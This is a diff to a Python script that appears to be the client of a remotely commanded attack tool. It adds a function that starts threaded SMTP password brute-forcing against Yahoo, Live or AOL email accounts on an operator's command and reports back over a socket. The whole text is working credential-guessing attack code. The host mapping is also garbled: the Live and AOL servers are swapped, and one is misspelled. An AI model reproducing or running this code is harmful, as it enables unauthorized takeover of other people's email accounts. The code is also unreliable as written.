@@ -419,6 +419,18 @@ def gmailbruteforce(email, combination, minimum, maximum):
         else:
             break
 
+def popularbruteforce(cmd):
+    try:
+        bruteinfo = cmd[1].split(":")
+        if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
+        elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
+        elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
+        t = Thread(None,custombruteforce,None,(server, 587, bruteinfo[0], bruteinfo[1], bruteinfo[2], bruteinfo[3]))
+        t.start()
+        s.send(bytes("[CLIENT] Bruteforcing started\n", 'utf-8'))
+    except:
+        s.send(bytes("[CLIENT] Wrong arguments\n", 'utf-8'))
+        
 def custombruteforce(address, port, email, combination, minimum, maximum):
     smtpserver = smtplib.SMTP(address,int(port))
     smtpserver.starttls()
